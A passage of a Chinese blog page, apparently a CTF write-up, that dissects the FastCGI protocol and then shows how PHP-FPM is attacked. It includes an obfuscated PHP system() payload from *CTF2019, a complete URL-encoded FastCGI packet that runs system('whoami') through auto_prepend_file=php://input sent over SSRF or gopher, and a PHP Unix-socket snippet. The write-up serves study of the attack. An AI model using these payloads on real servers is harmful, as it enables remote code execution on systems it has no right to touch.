+</li>
+<li><p>00 表示不 keep-alive，在处理完一次请求就关闭</p>
+</li>
+<li><p>五个 00 为保留字段</p>
+</li>
+</ul>
+<p>可以看见第一个包只是一些初始设置，接下来我们看第二个包，我们先看头：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 04 00 01 03 80 00 00</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>01 为 version</li>
+<li>04 说明在这个包中传递了环境参数</li>
+<li>00 01 为通信 ID</li>
+<li>03 80 说明 body 长度为 0x380，即 896，正好是总长度(936) - 两个包(32) - 头(8)</li>
+<li>00 00 表示 padding 长度为 0，没有保留字节</li>
+</ul>
+<p>type &#x3D; 4，body 的格式如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameData[nameLength];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameData[nameLength];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure>
+
+<p>我们来看这个包的 body，我们可以看到在一般情况下，键和值的长度用一个字节来表示就足够了，我们可以按照格式将 body 切分成很多个键值对：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line">data = <span class="string">&quot;&quot;</span> <span class="comment"># 抓到的整个包</span></span><br><span class="line">data = data[<span class="number">24</span>:-<span class="number">16</span>]</span><br><span class="line">point = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> point &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    key_len = <span class="built_in">ord</span>(data[point])</span><br><span class="line">    value_len = <span class="built_in">ord</span>(data[point + <span class="number">1</span>])</span><br><span class="line">    point += <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span> data[point: point + key_len] + <span class="string">&quot;: &quot;</span> + data[point + key_len: point + key_len + value_len]</span><br><span class="line">    point += key_len + value_len</span><br></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PATH_INFO: </span><br><span class="line">SCRIPT_FILENAME: /var/www/html/index.php</span><br><span class="line">QUERY_STRING: </span><br><span class="line">REQUEST_METHOD: GET</span><br><span class="line">CONTENT_TYPE: </span><br><span class="line">CONTENT_LENGTH: </span><br><span class="line">SCRIPT_NAME: /index.php</span><br><span class="line">REQUEST_URI: /index.php</span><br><span class="line">DOCUMENT_URI: /index.php</span><br><span class="line">DOCUMENT_ROOT: /var/www/html</span><br><span class="line">SERVER_PROTOCOL: HTTP/1.1</span><br><span class="line">REQUEST_SCHEME: http</span><br><span class="line">GATEWAY_INTERFACE: CGI/1.1</span><br><span class="line">SERVER_SOFTWARE: nginx/1.14.0</span><br><span class="line">REMOTE_ADDR: ??.??.??.??</span><br><span class="line">REMOTE_PORT: 26972</span><br><span class="line">SERVER_ADDR: 172.17.0.2</span><br><span class="line">SERVER_PORT: 80</span><br><span class="line">SERVER_NAME: _</span><br><span class="line">REDIRECT_STATUS: 200</span><br><span class="line">HTTP_HOST: ????????????.cn:32770</span><br><span class="line">HTTP_CONNECTION: keep-alive</span><br><span class="line">HTTP_PRAGMA: no-cache</span><br><span class="line">HTTP_CACHE_CONTROL: no-cache</span><br><span class="line">HTTP_UPGRADE_INSECURE_REQUESTS: 1</span><br><span class="line">HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span><br><span class="line">HTTP_ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">HTTP_ACCEPT_ENCODING: gzip, deflate</span><br><span class="line">HTTP_ACCEPT_LANGUAGE: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+<p>最后我们来看看最后一个包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 04 00 01 00 00 00 00 01 05 00 01 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>这似乎不是一个包，看起来应该是环境参数包的结尾，加上一个 type &#x3D; 5（即 POST 提交的数据）的包的头，不过因为我们是 GET 请求，所以这个包没有 body。type &#x3D; 5 的包（Stdin 数据包），这种包比较简单，body 就是 POST 的 body，比如 *CTF 的 payload 里面的包（拆开）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01 05 14 EC 01 1B 00 00</span><br><span class="line">&lt;?php system(gzinflate(base64_decode(&quot;jY7BCsIwDIZfJRTBVZzDHVf1ohdPE9QHKFvcCrUraacIPrztHJ487BKS///+JBZJQ4ow7x3CU5JRpnEiDs6TqvzQHk/7oigtmlzM3rCFtajaWlHCMsbF/QUzq+ogd5FIFl3v8yUslAmVrTJCWd+0bBiHjqBWOCQIrX6FzCbSO2FJGQ/ny6G8XkZTTIPiMmncEymA+JA6+Tp8xMMbwH4IE1FIdzfduzbhYsqJf9qU3BRm/gE=&quot;)));</span><br><span class="line">01 05 14 EC 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>对 FastCGI 的分析到这里就结束了，分析过 FastCGI 协议后，自己写脚本也不是那么难了呢。</p>
+<p>当然，菜鸡的我自然还是用大师傅们写好的脚本 √ 。</p>
+<hr>
+<h3 id="PHP-FPM利用方式"><a href="#PHP-FPM利用方式" class="headerlink" title="PHP-FPM利用方式"></a>PHP-FPM利用方式</h3><p>ph 牛早已做过研究：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<p>主要的攻击方式：SSRF 发送 TCP 包（TCP），或者通过 stream_socket_client（Unix socket）。</p>
+<p>虽然能执行的只有服务器上已经存在的 PHP 文件，但是我们可以通过设置 auto_prepend_file &#x3D; php:&#x2F;&#x2F;input 且 allow_url_include &#x3D; On，然后将 PHP 代码放在 POST body 中即可 RCE。</p>
+<p>我们稍加修改 ph 牛的脚本中的 request 函数，将 开头的连接判断 和 send 注释掉，直接 return request 进行输出即可，system(“whoami”) 的 payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%01%01%C8%0C%00%08%00%00%00%01%00%00%00%00%00%00%01%04%C8%0C%01%DB%00%00%0E%02CONTENT_LENGTH23%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%C8%0C%00%00%00%00%01%05%C8%0C%00%17%00%00%3C%3Fphp%20system%28%22whoami%22%29%3B%01%05%C8%0C%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p>使用 CURL 的 Gopher 协议进行发包，或者也可以使用 socket 进行连接。</p>
+<p>如果 PHP-FPM 使用的是 Unix socket，则需要执行如下的 PHP 代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span>=<span class="title function_ invoke__">stream_socket_client</span>(<span class="string">&#x27;unix:///run/php/php7.3-fpm.sock&#x27;</span>);<span class="title function_ invoke__">fputs</span>(<span class="variable">$sock</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="number">4096</span>));</span><br></pre></td></tr></table></figure>
+
+<p>然后提交 payload 即可。</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/5006#toc-3">https://xz.aliyun.com/t/5006#toc-3</a></p>
+<p><a href="https://github.com/sixstars/starctf2019/tree/master/web-echohub">https://github.com/sixstars/starctf2019/tree/master/web-echohub</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/FastCGI/">FastCGI</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/05/09/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>虚拟机环境搭建</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/05/05/CTF2019-996game%E5%A4%8D%E7%8E%B0-nodejs-mongodb%E4%BD%BF%E7%94%A8/">
+                        <span>*CTF2019-996game复现/nodejs+mongodb使用</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "FastCGI浅析&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
